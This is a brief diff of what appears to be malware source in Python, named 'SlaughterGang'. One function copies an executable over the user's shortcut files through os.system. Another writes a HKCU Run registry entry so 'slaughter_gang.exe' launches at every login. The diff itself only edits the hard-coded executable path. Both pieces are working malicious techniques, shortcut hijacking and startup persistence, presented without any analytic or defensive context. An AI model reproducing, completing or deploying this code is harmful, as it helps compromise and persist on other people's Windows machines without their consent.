@@ -17,7 +17,7 @@ def replace_shortcuts():
                 os.system(f'copy "{exe_path}" "{shortcut_path}"')
 
 def run_on_startup():
-    exe_path = "C:\\path\\to\\slaughter_gang.exe"  # Replace with the actual path to your executable
+    exe_path = "C:\slaughter_gang.exe"  # 
 
     with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE) as reg_key:
         winreg.SetValueEx(reg_key, "SlaughterGang", 0, winreg.REG_SZ, exe_path)
